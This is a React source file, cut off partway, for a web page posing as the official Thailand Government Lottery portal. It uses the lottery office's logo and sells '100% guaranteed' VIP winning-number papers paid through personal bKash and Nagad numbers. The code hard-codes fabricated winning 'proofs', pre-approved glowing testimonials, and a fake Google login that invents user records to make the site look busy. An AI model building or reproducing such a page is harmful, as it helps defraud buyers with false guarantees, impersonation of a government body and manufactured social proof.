import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, Lock, Unlock, Crown, Sparkles, Copy, CheckCircle, 
  Phone, Globe, Star, FileText, Download, 
  Settings, Users, DollarSign, LogOut, ZoomIn, 
  X, Award, Bell, Key, ExternalLink
} from 'lucide-react';

export default function App() {
  const [isAdminOpen, setIsAdminOpen] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [activeAdminTab, setActiveAdminTab] = useState('upcoming');

  const [brandTitle, setBrandTitle] = useState('Thailand Government Lottery');
  const [brandSubtitle, setBrandSubtitle] = useState('สำนักงานสลากกินแบ่งรัฐบาล • Official Portal');
  const [logoUrl, setLogoUrl] = useState('https://www.glo.or.th/assets/img/logo.png');
  const [partnerName, setPartnerName] = useState('Ariyan chaudhari');
  const [partnerRole, setPartnerRole] = useState('Authorized VIP Distributor & Official Analyst');
  const [partnerAvatar, setPartnerAvatar] = useState('https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=300');
  const [bkashNumber, setBkashNumber] = useState('01700-000000 (Personal)');
  const [nagadNumber, setNagadNumber] = useState('01800-000000 (Personal)');
  const [imoNumber, setImoNumber] = useState('+8801700000000');
  const [noticeText, setNoticeText] = useState('⚠️ বিশেষ ঘোষণা: আগামী ১৬ ডিসেম্বর ড্র-এর ১০০% নিশ্চিত ভিআইপি পেপার বুকিং চলছে। বিকাশ বা নগদ সেন্ড মনি করে শেষ ৪ ডিজিট দিয়ে পেপার আনলক করুন।');
  const [drawDateText, setDrawDateText] = useState('16 December 2026');
  const [countdownTarget, setCountdownTarget] = useState('2026-12-16T16:00:00');

  const [sarPrice, setSarPrice] = useState(125);
  const [bdtPrice, setBdtPrice] = useState(4000);
  const [upcomingPaperImage, setUpcomingPaperImage] = useState('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800');
  const [isUnlocked, setIsUnlocked] = useState(false);

  const [currentUser, setCurrentUser] = useState(null);
  const [isLoginModalOpen, setIsLoginModalOpen] = useState(false);
  const [loginHistory, setLoginHistory] = useState([
    { name: 'Rafiqul Islam', email: 'rafiqul.official@gmail.com', time: '2026-11-20 14:30:12' },
    { name: 'Tanvir Ahmed', email: 'tanvir99@gmail.com', time: '2026-11-20 12:15:00' }
  ]);

  const [isPaymentModalOpen, setIsPaymentModalOpen] = useState(false);
  const [senderLast4, setSenderLast4] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('bkash');
  const [pendingPayments, setPendingPayments] = useState([
    { id: 1, name: 'Rafiqul Islam', email: 'rafiqul.official@gmail.com', last4: '4829', method: 'bKash', amountSar: 125, amountBdt: 4000, time: '2026-11-20 14:35:00', status: 'Pending' }
  ]);

  const [pastPapers, setPastPapers] = useState([
    { 
      id: 1, 
      date: '16 พฤศจิกายน 69 (16 Nov 2026)', 
      image: 'https://images.unsplash.com/photo-1543269865-cbf427effbad?auto=format&fit=crop&q=80&w=800', 
      up3: '654', 
      down: '82', 
      caption: '100% Direct Winning VIP Paper Proof (16 Nov 2026)' 
    },
    { 
      id: 2, 
      date: '01 พฤศจิกายน 69 (01 Nov 2026)', 
      image: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800', 
      up3: '308', 
      down: '45', 
      caption: 'Direct Hit VIP Paper (01 Nov 2026)' 
    }
  ]);

  const [reviews, setReviews] = useState([
    { id: 1, name: 'Nazmul Hossain', rating: 5, comment: 'আলহামদুলিল্লাহ, ভিআইপি পেপার নিয়ে প্রথমবারেই সরাসরি ৩UP উইন করেছি। অনেক ধন্যবাদ আরিয়ান ভাই!', status: 'Approved' },
    { id: 2, name: 'Jahangir Alam', rating: 5, comment: 'খুব বিশ্বস্ত সার্ভিস। পেমেন্ট করার ৫ মিনিটের মধ্যে পেপার পেয়ে গেছি।', status: 'Approved' }
  ]);
  const [newReviewName, setNewReviewName] = useState('');
  const [newReviewComment, setNewReviewComment] = useState('');

  const [zoomImage, setZoomImage] = useState(null);
  const [hdClarity, setHdClarity] = useState(true);
  const [timeLeft, setTimeLeft] = useState({ days: 0, hours: 0, minutes: 0, seconds: 0 });

  useEffect(() => {
    const timer = setInterval(() => {
      const now = new Date().getTime();
      const target = new Date(countdownTarget).getTime();
      const difference = target - now;

      if (difference > 0) {
        setTimeLeft({
          days: Math.floor(difference / (1000 * 60 * 60 * 24)),
          hours: Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
          minutes: Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60)),
          seconds: Math.floor((difference % (1000 * 60)) / 1000),
        });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [countdownTarget]);

  useEffect(() => {
    const checkAdminRoute = () => {
      const hash = window.location.hash;
      const search = window.location.search;
      const path = window.location.pathname;
      if (hash === '#admin' || search.includes('admin=true') || path.includes('/admin')) {
        setIsAdminOpen(true);
      }
    };
    checkAdminRoute();
    window.addEventListener('hashchange', checkAdminRoute);
    return () => window.removeEventListener('hashchange', checkAdminRoute);
  }, []);

  const handleGoogleLoginSimulate = () => {
    const randomNames = ['Imran Khan', 'Abdul Rahim', 'Nasir Uddin', 'Kamal Hossain', 'Sumon Ahmed'];
    const name = randomNames[Math.floor(Math.random() * randomNames.length)];
    const email = name.toLowerCase().replace(/\s+/g, '') + Math.floor(Math.random() * 900 + 100) + '@gmail.com';
    const userObj = { name, email, photo: partnerAvatar };
    setCurrentUser(userObj);
    setIsLoginModalOpen(false);

    const newRecord = { name, email, time: new Date().toLocaleString() };
    setLoginHistory([newRecord, ...login
